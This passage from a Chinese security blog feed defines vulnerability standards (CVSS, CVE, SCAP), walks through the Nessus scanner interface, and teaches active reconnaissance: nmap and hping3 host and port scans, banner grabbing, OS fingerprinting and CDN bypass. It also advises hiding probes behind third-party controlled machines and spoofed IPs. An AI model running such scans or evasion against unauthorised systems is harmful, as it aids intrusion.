title="CVSS"></a>CVSS</h2><ol><li><p>通用漏洞评分系统，工业标准</p></li><li><p>描述安全漏洞严重程度的统一评分方案</p></li><li><p>分值范围：0–10</p></li><li><p>不同机构按<code>CVSS</code>分值定义威胁的中、高、低威胁级别</p></li><li><p><code>CVSS</code>体现漏洞的风险</p></li><li><p>威胁级别表示漏洞对那个风险对企业的影响程度</p></li></ol><h2 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h2><ol><li><p>已公开的信息安全漏洞字典(<code>MITRE</code>公司维护)</p></li><li><p>统一的漏洞编号标准</p></li><li><p>实现不同厂商之间信息交换的统一标准</p></li></ol><h2 id="MS"><a href="#MS" class="headerlink" title="MS"></a>MS</h2><p>微软漏洞编号</p><p><code>KB</code>：微软补丁编号</p><h2 id="OVAL"><a href="#OVAL" class="headerlink" title="OVAL"></a>OVAL</h2><ol><li><p>描述漏洞检测方法的机器可识别语言</p></li><li><p>详细的描述漏洞检测的技术细节，可导入自动化检测工具中实施漏洞检测工作</p></li><li><p>以<code>XML</code>语言描述</p></li></ol><h2 id="SCAP"><a href="#SCAP" class="headerlink" title="SCAP"></a>SCAP</h2><p>集合了多种安全标准的框架</p><p>六个元素：<code>CVE</code>、<code>OVAL</code>、<code>CCE</code>、<code>CPE</code>、<code>CVSS</code>、<code>XCCDF</code></p><p>目的使以标准的方法展示和操作安全数据</p><p>由<code>NIST</code>(美国国家标准技术研究所)负责维护</p><p>解决三个问题：</p><ol><li><p>实现高层政策法规等到底层实施的落地</p></li><li><p>将信息安全所涉及的各个要素标准化</p></li><li><p>将复杂的系统配置核查工作自动化</p></li></ol><h2 id="CNVD"><a href="#CNVD" class="headerlink" title="CNVD"></a>CNVD</h2><p>国家信息安全漏洞共享平台（<code>CNVD</code>）是由国家计算机网络应急技术处理协调中心（中文简称国家互联应急中心，英文简称<code>CNCERT</code>）联合国内重要信息系统单位、基础电信运营商、网络安全厂商、软件厂商和互联网企业建立的信息安全漏洞信息共享知识库</p><hr><h1 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h1><ol><li><p>周期性扫描跟踪漏洞</p></li><li><p>高危漏洞优先处理</p></li><li><p>进行合理的扫描</p></li></ol><hr><h1 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>家庭版：免费使用</p><p>专业版：收费，无限并发连接</p><p><img src="/images/shentouceshi_tools/nessus/16.png" alt="1.png"></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>参见 <a href="/2019/05/11/kali下安装nessus/">Kali下安装Nessus</a></p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>在“扫描”页面上，您可以创建，查看和管理扫描和资源。要访问“扫描”页面，请在顶部导航栏中单击“扫描”。左侧导航栏显示文件夹和资源两部分。</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/6.png" alt="6.png"></p><h2 id="文件夹"><a href="#文件夹" class="headerlink" title="文件夹"></a>文件夹</h2><p>“文件夹”部分始终包含以下不能删除的默认文件夹：我的扫描、所有扫描、废纸篓</p><p>当您访问“扫描”页面时，将显示“我的扫描”文件夹。当您创建扫描时，它默认显示在“我的扫描”文件夹中</p><p>在所有扫描的文件夹显示所创建的所有扫描以及与有权限进行交互的任何扫描。可以点击文件夹中的扫描来查看扫描结果</p><p>“废纸篓”文件夹显示已删除的扫描。可以从<code>Nessus</code>实例中永久删除扫描，或将扫描恢复到选定的文件夹。如果删除包含扫描的文件夹，则该文件夹中的所有扫描都将移至“废纸篓”文件夹。存储在“废纸篓”文件夹中的扫描将在30天后自动删除。</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/4.png" alt="4.png"></p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>策略 插件规则 扫描器</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/5.png" alt="5.png"></p><h3 id="资源之策略"><a href="#资源之策略" class="headerlink" title="资源之策略"></a>资源之策略</h3><ol><li><p>控制扫描技术方面的参数，如超时时间，主机数量，端口扫描器类型等等</p></li><li><p>用于本地扫描（例如<code>Windows</code>，<code>SSH</code>），经过身份验证的<code>Oracle</code>数据库扫描，<code>HTTP</code>，<code>FTP</code>，<code>POP</code>，<code>IMAP</code>或基于<code>Kerberos</code>的身份验证的凭证</p></li><li><p>精细的家庭或基于插件的扫描规范</p></li><li><p>数据库合规性策略检查，报告详细程度，服务检测扫描设置，<code>Unix</code>合规性检查等等</p></li><li><p>对网络设备进行脱机配置审计，可以安全检查网络设备，而无需直接扫描设备</p></li><li><p><code>Windows</code>恶意软件扫描，比较文件的<code>MD5</code>校验和，包括已知的好文件和恶意文件</p></li></ol><h3 id="资源之插件规则"><a href="#资源之插件规则" class="headerlink" title="资源之插件规则"></a>资源之插件规则</h3><p>允许隐藏或改变任何给定的插件的严重性。另外，规则可以限制在特定的主机或特定的时间范围内。在此页面上，您可以查看，创建，编辑和删除您的规则</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/7.png" alt="7.png"></p><h3 id="资源之扫描器"><a href="#资源之扫描器" class="headerlink" title="资源之扫描器"></a>资源之扫描器</h3><p>该扫描器页面显示的链接键和遥控器的扫描器列表。您可以点击链接的扫描器查看有关该扫描器的详细信息</p><p>扫描器由扫描器类型标识，并指示扫描器是否具有共享权限</p><p>可以使用链接密钥或有效帐户凭证将远程扫描器链接到<code>Nessus Manager</code>。一旦链接，扫描器可以在本地进行管理，并在配置扫描时进行选择</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/8.png" alt="8.png"></p><h2 id="扫描模板"><a href="#扫描模板" class="headerlink" title="扫描模板"></a>扫描模板</h2><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/2.png" alt="2.png"></p><h3 id="扫描模板之设置"><a href="#扫描模板之设置" class="headerlink" title="扫描模板之设置"></a>扫描模板之设置</h3><p>每个策略都存在以下设置，但可用的配置项目可能因所选模板而异</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/99.png" alt="9.png"></p><p>基本 发现 评定 报告 高级</p><h3 id="扫描模板之凭证"><a href="#扫描模板之凭证" class="headerlink" title="扫描模板之凭证"></a>扫描模板之凭证</h3><p>每个策略都存在以下设置，但可用的配置项目可能因所选模板而异</p><ol><li><p>云服务：</p><ol><li><p><code>AWS</code>：亚马逊网络服务</p></li><li><p><code>Microsoft Azure</code>：微软基于云计算的操作系统</p></li><li><p><code>Rackspace</code>：全球三大云计算中心之一，是一家全球领先的托管服务器及云计算提供商，公司总部位于美国</p></li><li><p><code>Salesforce.com</code>：<code>Salesforce</code>是处于世界首位的开发<code>CRM</code>客户关系管理平台。软件基于云端，因此用户不需要IT专家团队进行安装设置或管理，只需登陆即可使用</p></li><li><p><code>Red Hat Enterprise Virtualization</code>：红帽企业虚拟化</p></li></ol></li><li><p>数据库：包括<code>MongoDB</code>，<code>Oracle</code>，<code>MySQL</code>，<code>DB2</code>，<code>PostgreSQL</code>和<code>SQL Server</code></p></li><li><p>主机：其中包括<code>Windows</code>登录，<code>SSH</code>和<code>SNMPv3</code></p></li><li><p>其他服务：<code>VMware</code>，<code>Red Hat Enterprise Virtualization</code>等</p></li><li><p>明文身份验证机制：包括<code>FTP</code>，<code>HTTP</code>，<code>POP3</code>和其他服务</p></li></ol><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/10.png" alt="10.png"></p><h3 id="扫描模板之插件"><a href="#扫描模板之插件" class="headerlink" title="扫描模板之插件"></a>扫描模板之插件</h3><p>插件选项可以选择插件系列的安全检查或单个插件检查</p><p>点击插件系列，您可以启用（绿色）或禁用（灰色）整个系列。选择一个系列显示其插件列表。可以启用或禁用单个插件来创建特定的扫描</p><p>禁用某些插件的系列是紫色的，并显示混合，表明只有一些插件已启用。点击插件家族加载完整的插件列表，并允许根据您的扫描偏好细粒度选择</p><p>插件的详细信息包括 摘要，说明，解决方案，插件信息和风险信息</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/122.png" alt="12.png"></p><h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/13.png" alt="13.png"></p><p>关于 高级 代理服务器 SMTP服务器 自定义CA 密码管理 扫描健康 我的帐户</p><h3 id="设置之关于"><a href="#设置之关于" class="headerlink" title="设置之关于"></a>设置之关于</h3><p>”关于”页面显示Nessus许可和插件信息的概述。当您访问产品设置时，默认情况下出现关于页面</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/14.png" alt="14.png"></p><h3 id="设置之高级"><a href="#设置之高级" class="headerlink" title="设置之高级"></a>设置之高级</h3><p>高级设置允许您手动配置全局设置。为了使这些设置生效，可能需要重新启动<code>Nessus</code>服务或服务器。注意:在扫描或策略中配置的设置将覆盖这些值</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/15.png" alt="15.png"></p><h3 id="设置之代理服务器"><a href="#设置之代理服务器" class="headerlink" title="设置之代理服务器"></a>设置之代理服务器</h3><p>代理服务器用于转发<code>HTTP</code>请求。如果您的组织需要一个，<code>Nessus</code>将使用这个代理服务器从可靠的地方获得软件更新。只需要主机和端口字段。如果需要，可以使用用户名、密码、身份验证类型和用户代理</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/16.png" alt="16.png"></p><h3 id="设置之邮件服务"><a href="#设置之邮件服务" class="headerlink" title="设置之邮件服务"></a>设置之邮件服务</h3><p>简单邮件传输协议(<code>SMTP</code>)是发送和接收电子邮件的行业标准。一旦为<code>SMTP</code>配置好，扫描结果将通过电子邮件发送到扫描的“电子邮件通知”配置中指定的收件人列表。这些结果可以通过过滤器定制，并需要一个<code>HTML</code>兼容的电子邮件客户端</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/17.png" alt="17.png"></p><h3 id="设置之自定义CA"><a href="#设置之自定义CA" class="headerlink" title="设置之自定义CA"></a>设置之自定义CA</h3><p>在扫描期间保存自定义证书颁发机构(<code>CA</code>)有助于减轻来自插件#51192 (<code>SSL</code>证书不可信)的发现</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/18.png" alt="18.png"></p><h3 id="设置之密码管理"><a href="#设置之密码管理" class="headerlink" title="设置之密码管理"></a>设置之密码管理</h3><p>密码管理允许您设置密码参数，以及打开登录通知和设置会话超时。登录通知允许用户查看最近一次成功登录、最近一次失败登录尝试(日期、时间和<code>IP</code>)以及自上次成功登录以来是否发生了任何失败的登录尝试。更改将在软重启后生效</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/19.png" alt="19.png"></p><h3 id="设置之扫描健康"><a href="#设置之扫描健康" class="headerlink" title="设置之扫描健康"></a>设置之扫描健康</h3><p>以图表的方式显示<code>NESSUS</code>的运行健康状态</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/20.png" alt="20.png"></p><h3 id="设置之我的账户"><a href="#设置之我的账户" class="headerlink" title="设置之我的账户"></a>设置之我的账户</h3><p>此页面可进行账户密码更改、<code>API</code>密钥生成等</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/21.png" alt="21.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="信息安全" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>信息收集--主动</title>
    <link href="http://yoursite.com/2019/05/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%B8%BB%E5%8A%A8/"/>
    <id>http://yoursite.com/2019/05/14/信息收集-主动/</id>
    <published>2019-05-14T15:36:00.000Z</published>
    <updated>2020-03-04T16:18:57.237Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>被动信息收集的结果可能不准确，并不是最新的。利用主动信息收集来进行验证</p><p>流程：</p><p>发现存活主机–&gt;扫描开放端口–&gt;识别端口对应的应用程序–&gt;利用应用程序漏洞–&gt;通过端口攻击进入系统</p><h1 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h1><ol><li><p>直接与目标进行交互</p></li><li><p>使用代理、第三方受控的计算机进行探测(避免目标系统封堵<code>IP</code>)</p></li><li><p>做好被封<code>IP</code>的准备</p></li><li><p>使用噪声迷惑目标，淹没真实的探测流量(伪造<code>IP</code>迷惑目标，将真实的探测隐于其中)</p></li></ol><h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><p>发现阶段用于识别活着的主机(潜在的攻击目标)</p><h2 id="二层主机发现"><a href="#二层主机发现" class="headerlink" title="二层主机发现"></a>二层主机发现</h2><p>使用协议：<code>ARP</code>协议</p><p>优点：扫描速度快，可靠</p><p>缺点：不可路由，只可发现本网段内的主机，不可跨网段扫描</p><h3 id="arping"><a href="#arping" class="headerlink" title="arping"></a>arping</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arping 1.1.1.1 -c 1</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/1.png" alt="1.png"></p><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 1.1.1.1</span><br><span class="line"></span><br><span class="line">-sn：ping扫描，禁止端口扫描</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/2.png" alt="2.png"></p><h3 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h3><p>专用于二层发现，可用于无线和有线网络，可选择主动或被动探测方式</p><h4 id="主动探测"><a href="#主动探测" class="headerlink" title="主动探测"></a>主动探测</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0/24</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/3.png" alt="3.png"></p><h4 id="被动探测"><a href="#被动探测" class="headerlink" title="被动探测"></a>被动探测</h4><p>将网卡置于混杂模式，用于嗅探网络中的<code>ARP</code>数据包，根据<code>ARP</code>数据包判断主机是否存活</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -p</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/4.png" alt="4.png"></p><h2 id="三层主机发现"><a href="#三层主机发现" class="headerlink" title="三层主机发现"></a>三层主机发现</h2><p>使用协议：<code>IP</code>协议、<code>ICMP</code>协议</p><p>优点：可路由，速度较快</p><p>缺点：速度比二层慢，可能被边界防火墙过滤</p><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 1.1.1.1 -c 5</span><br></pre></td></tr></table></figure><h3 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">traceroute www.baidu.com</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/5.png" alt="5.png"></p><h2 id="四层主机发现"><a href="#四层主机发现" class="headerlink" title="四层主机发现"></a>四层主机发现</h2><p>使用协议：<code>TCP</code>协议、<code>UDP</code>协议</p><p>优点：可路由，结果可靠</p><p>缺点：基于状态过滤的防火墙可能过滤扫描</p><h3 id="TCP主机发现"><a href="#TCP主机发现" class="headerlink" title="TCP主机发现"></a>TCP主机发现</h3><p>原理：向主机<code>IP</code>主机发送未经请求的<code>ACK</code>数据包</p><p>若目标<code>IP</code>存在，不论用于探测的端口是否开放，都将返回<code>RST</code>数据包</p><p>若目标<code>IP</code>不存在，将无任何返回</p><h4 id="nmap-1"><a href="#nmap-1" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 1.1.1.0/24 -PA80 -sn</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/666.png" alt="6.png"></p><h4 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 1.1.1.1 -c 1</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/9.png" alt="9.png"></p><h3 id="UDP主机发现"><a href="#UDP主机发现" class="headerlink" title="UDP主机发现"></a>UDP主机发现</h3><p>原理：</p><p>若目标存在，用于探测的端口也是开放的，则用于探测的包会一去不复返，无回包</p><p>若目标不存在，则用于探测的包会以取不复返，无回包</p><p>只有目标存在，用于探测的端口是未开放的，目标主机才会返回<code>ICMP</code>端口不可达，以证明目标存在</p><h4 id="nmap-2"><a href="#nmap-2" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 1.1.1.0/24 -PU2356 -sn</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/7.png" alt="7.png"></p><h4 id="hping3-1"><a href="#hping3-1" class="headerlink" title="hping3"></a>hping3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 --udp 1.1.1.1 -c 1</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/8.png" alt="8.png"></p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>通过扫描服务器开放端口以及从该端口判断服务器上存在的服务，最常见的工具是<code>nmap</code>，无状态端口扫描工具<code>Masscan</code>、<code>ZMap</code>和御剑高速<code>TCP</code>端口扫描工具</p><h2 id="常见端口及攻击方向"><a href="#常见端口及攻击方向" class="headerlink" title="常见端口及攻击方向"></a>常见端口及攻击方向</h2><h3 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h3><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/20.png" alt="20.png"></p><h3 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h3><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/21.png" alt="21.png"></p><h3 id="web应用"><a href="#web应用" class="headerlink" title="web应用"></a>web应用</h3><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/22.png" alt="22.png"></p><h3 id="数据库服务"><a href="#数据库服务" class="headerlink" title="数据库服务"></a>数据库服务</h3><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/23.png" alt="23.png"></p><h3 id="邮件服务"><a href="#邮件服务" class="headerlink" title="邮件服务"></a>邮件服务</h3><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/24.png" alt="24.png"></p><h3 id="网络常见协议端口"><a href="#网络常见协议端口" class="headerlink" title="网络常见协议端口"></a>网络常见协议端口</h3><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/25.png" alt="25.png"></p><h3 id="特殊服务"><a href="#特殊服务" class="headerlink" title="特殊服务"></a>特殊服务</h3><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/26.png" alt="26.png"></p><h2 id="TCP端口扫描"><a href="#TCP端口扫描" class="headerlink" title="TCP端口扫描"></a>TCP端口扫描</h2><h3 id="全连接扫描"><a href="#全连接扫描" class="headerlink" title="全连接扫描"></a>全连接扫描</h3><p>完整进行三次握手过程，结果非常准确，但容易被目标发现</p><h4 id="nmap-3"><a href="#nmap-3" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT 1.1.1.1 -p 100-200</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/10.png" alt="10.png"></p><h4 id="dmitry"><a href="#dmitry" class="headerlink" title="dmitry"></a>dmitry</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry -p 1.1.1.1</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/11.png" alt="11.png"></p><h3 id="隐蔽扫描"><a href="#隐蔽扫描" class="headerlink" title="隐蔽扫描"></a>隐蔽扫描</h3><p>对目标端口发送<code>SYN</code>数据包</p><p>若目标端口开放，会返回<code>SYN+ACK</code>数据包</p><p>若目标端口未开放，会返回<code>RST</code>数据包</p><h4 id="nmap-4"><a href="#nmap-4" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS 1.1.1.1 -p 1-100</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/12.png" alt="12.png"></p><h4 id="hping3-2"><a href="#hping3-2" class="headerlink" title="hping3"></a>hping3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 1.1.1.1 --scan 1-100 -S</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/13.png" alt="13.png"></p><h2 id="UDP端口扫描"><a href="#UDP端口扫描" class="headerlink" title="UDP端口扫描"></a>UDP端口扫描</h2><p>对目标指定端口发送请求</p><p>若目标返回<code>ICMP</code>端口不可达，表示目标端口关闭</p><p>若目标未返回任何数据包，则认为目标端口开放，存在误判</p><h3 id="nmap-5"><a href="#nmap-5" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU 1.1.1.1</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/14.png" alt="14.png"></p><h1 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h1><p>要求：</p><ol><li><p>识别开放端口上运行的应用</p></li><li><p>识别目标操作系统</p></li></ol><h2 id="获取Banner信息"><a href="#获取Banner信息" class="headerlink" title="获取Banner信息"></a>获取Banner信息</h2><p><code>Banner</code>信息：软件开发商、软件名称、服务类型、版本号</p><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 1.1.1.1 53</span><br></pre></td></tr></table></figure><h3 id="dmitry-1"><a href="#dmitry-1" class="headerlink" title="dmitry"></a>dmitry</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry -pb 1.1.1.1</span><br></pre></td></tr></table></figure><h3 id="nmap-6"><a href="#nmap-6" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT 1.1.1.1 -p 1-100 --script=banner.nse</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/15.png" alt="15.png"></p><h3 id="amap"><a href="#amap" class="headerlink" title="amap"></a>amap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">amap -B 1.1.1.1 902</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/16.png" alt="16.png"></p><h2 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h2><p>根据响应特征分析识别服务：发送一系列复杂的探测，依据响应判断</p><h3 id="nmap-7"><a href="#nmap-7" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 1.1.1.1 -p 1-100 -sV</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/17.png" alt="17.png"></p><h2 id="操作系统识别"><a href="#操作系统识别" class="headerlink" title="操作系统识别"></a>操作系统识别</h2><h3 id="TTL起始值"><a href="#TTL起始值" class="headerlink" title="TTL起始值"></a>TTL起始值</h3><ol><li><p><code>Windows</code>：128，范围65–128</p></li><li><p><code>Linux/Unix</code>：64，范围1-64</p></li><li><p>某些<code>Unix</code>：255</p></li></ol><h3 id="nmap-8"><a href="#nmap-8" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O 1.1.1.1</span><br></pre></td></tr></table></figure><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/18.png" alt="18.png"></p><h3 id="被动分析"><a href="#被动分析" class="headerlink" title="被动分析"></a>被动分析</h3><p>监听网络内数据包，以判断与本机进行数据通信的主机的操作系统类型</p><p><img src="/images/KaliLinux_shentouceshi/zhudongxinxishouji/19.png" alt="19.png"></p><h1 id="CMS指纹识别"><a href="#CMS指纹识别" class="headerlink" title="CMS指纹识别"></a>CMS指纹识别</h1><p>指纹由于终身性、不变性、唯一性和方便性，几乎已经成为生物识别的代名词</p><p>这里指网站<code>CMS</code>指纹识别及<code>web</code>容器的指纹识别等</p><p>应用程序一般在<code>html</code>、<code>js</code>、<code>css</code>等文件中会包含一些特征码，比如<code>wordpress</code>在<code>robots.txt</code>中会包含<code>wp-admin</code>、首页<code>index.php</code>中会包含<code>generator=wordpress 3.xx</code>，这就是<code>CMS</code>指纹</p><p><code>CMS(Content Management System)</code>称为整站系统或文章系统。开发者需提供一个软件包，客户进行安装配置、维护内容就可以</p><p>常见<code>CMS</code>有<code>Dedecms</code>(织梦)、<code>Discuz</code>、<code>PHPWEB</code>、<code>PHPWind</code>、<code>PHPCMS</code>、<code>ECShop</code>、<code>Dvbbs</code>、<code>SiteWeaver</code>、<code>ASPCNMS</code>、帝国、<code>Z-Blog</code>、<code>WordPress</code>等</p><p>常用工具有：御剑<code>whatweb</code>、<code>webrobo</code>、椰树、轻量<code>web</code>指纹识别等</p><p>在线查询<code>CMS</code>指纹网站：</p><ol><li><p><code>BugScaner</code>：<a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/</a></p></li><li><p>云悉指纹：<a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a></p></li><li><p><code>WhatWeb</code>：<a href="https://www.whatweb.net/" target="_blank" rel="noopener">https://www.whatweb.net/</a></p></li></ol><h1 id="获取真实IP"><a href="#获取真实IP" class="headerlink" title="获取真实IP"></a>获取真实IP</h1><p>一般目标网站只有一个域名，但是对应的真实<code>IP</code>有时会很难确定</p><p><code>CDN</code>(内容分发网络)，主要解决因传输距离和不同运营商节点造成的网络速度性能低下问题。就是在一组不同运营商之间的对接节点上的高速缓存服务器，将用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户最近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程服务器上进行响应，可以大大提高网站响应速度及用户体验</p><p>若目标网站使用<code>CDN</code>服务，直接<code>ping</code>域名，得到的不是目标真正<code>IP</code>地址，而只是距离近的<code>CDN</code>服务器</p><h2 id="判断目标是否使用CDN"><a href="#判断目标是否使用CDN" class="headerlink" title="判断目标是否使用CDN"></a>判断目标是否使用CDN</h2><p>利用在线网站<code>17CE</code>(<a href="https://www.17ce.com/)，进行全国多地区的`ping`服务器操作，通过判断各地区的`ping`结果，判断是否使用`CDN`" target="_blank" rel="noopener">https://www.17ce.com/)，进行全国多地区的`ping`服务器操作，通过判断各地区的`ping`结果，判断是否使用`CDN`</a></p><p>若<code>IP</code>地址相同，极可能不存在<code>CDN</code></p><p>若<code>IP</code>大多不一样或规律性很强，可以尝试查询这些<code>IP</code>的归属地，判断是否使用<code>CDN</code></p><h2 id="绕过CDN"><a href="#绕过CDN" class="headerlink" title="绕过CDN"></a>绕过CDN</h2><ol><li><p>内部邮箱源。一般邮件系统处于内部，没有经过CDN解析，通过网站用户注册或者<code>RSS</code>订阅功能，查看邮件头中的邮件服务器域名，以此域名获取真实<code>IP</code></p></li><li><p>扫描网站测试文件。如<code>phpinfo</code>、<code>test</code>等</p></li><li><p>分站域名。很多网站主站会使用<code>CDN</code>，但分站可能并没有使用<code>CDN</code>。通过分站域名获取分站<code>IP</code>，可能存在分站与主站不是同一<code>IP</code>，但是属于同一<code>IP</code>段的情况</p></li><li><p>国外访问。国内<code>CDN</code>通常只会针对国内用户提供访问加速。可以通过国外在线代理网站<code>App Synthetic Monitor</code>(<a href="https://asm.ca.com/zh_cn/ping.php" target="_blank" rel="noopener">https://asm.ca.com/zh_cn/ping.php</a>) 